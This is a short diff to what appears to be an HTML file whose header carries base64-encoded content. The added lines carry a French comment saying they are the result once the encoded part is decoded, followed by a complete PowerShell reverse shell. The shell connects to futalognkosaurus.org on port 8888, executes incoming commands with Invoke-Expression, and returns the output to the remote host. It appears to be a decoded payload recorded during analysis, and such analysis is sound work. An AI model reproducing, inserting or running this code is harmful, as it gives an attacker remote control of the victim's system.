@@ -134,3 +134,16 @@ ZT4KCgoKICAgICAgICA8L2Jsb2NrcXVvdGU+PGJyPgogICAgPC9kaXY+
 
         </blockquote><br>
     </div>
+#resultat une fois la partie décoder
+$client = New-Object System.Net.Sockets.TCPClient('futalognkosaurus.org', 8888);
+$stream = $client.GetStream();
+[byte[]]$bytes = 0..65535|%{0};
+while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
+    $data = ([System.Text.Encoding]::ASCII).GetString($bytes, 0, $i);
+    $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String);
+    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
+    $sendbyte = ([System.Text.Encoding]::ASCII).GetBytes($sendback2);
+    $stream.Write($sendbyte, 0, $sendbyte.Length);
+    $stream.Flush();
+}
+$client.Close();  
